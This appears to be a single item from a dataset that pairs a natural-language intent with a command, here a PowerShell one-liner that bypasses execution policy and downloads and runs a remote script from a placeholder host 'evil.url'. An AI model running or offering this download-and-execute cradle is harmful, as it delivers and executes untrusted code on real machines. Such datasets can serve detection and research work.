# Natural language intent:
# Downloads and executes a PowerShell script from a specified URL.

powershell.exe -exec bypass -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://evil.url')"
